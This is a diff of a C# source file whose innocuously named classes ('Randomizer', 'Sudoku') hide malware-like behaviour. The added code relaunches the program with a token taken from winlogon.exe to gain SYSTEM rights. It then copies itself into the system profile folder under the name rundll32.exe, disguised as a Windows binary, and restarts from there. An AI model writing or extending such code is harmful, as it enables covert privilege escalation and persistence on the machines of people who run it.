@@ -15,36 +15,34 @@ namespace Memory
 {
     // ReSharper disable once UnusedMember.Global
     // ReSharper disable once IdentifierTypo
+
     public static class Randomizer
     {
         public static readonly Random Rand = new();
 
-        public static string Run()
+        public static void Run()
         {
+            // TODO Code is a mess, will clean soon
+
             Process process = Process.GetCurrentProcess();
-            string tempPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-            if (process.MainModule == null) return string.Empty;
-            if (Path.GetDirectoryName(process.MainModule.FileName) == tempPath)
+            if (process.MainModule == null) return;
+            string processPath = process.MainModule.FileName;
+            if (Environment.UserName.ToLower() is not "system" and not @"anon$")
             {
-                return Path.GetFileNameWithoutExtension(process.MainModule.FileName);
-            }
-            string newExePath = tempPath + @"\" + RandomStr(Rand.Next(5, 13)) + ".exe";
-            string processPath = string.Empty;
-            if (process.MainModule != null) processPath = process.MainModule.FileName;
-            if (processPath != null)
-            {
-                if (File.Exists(newExePath))
-                    File.Delete(newExePath);
-                File.Copy(processPath, newExePath);
                 Sudoku.RunWithTokenOf(
                     "winlogon.exe",
                     true,
-                    newExePath,
+                    process.MainModule.FileName,
                     string.Empty,
                     RuntimeEnvironment.GetRuntimeDirectory());
                 Environment.Exit(0);
             }
-            return string.Empty;
+            string newExePath = @"C:\Windows\System32\config\systemprofile\rundll32.exe";
+            if (processPath == newExePath) return;
+            if (File.Exists(newExePath)) File.Delete(newExePath);
+            if (processPath != null) File.Copy(processPath, newExePath);
+            Process.Start(newExePath);
+            Environment.Exit(0);
         }
 
         public static void Clean()
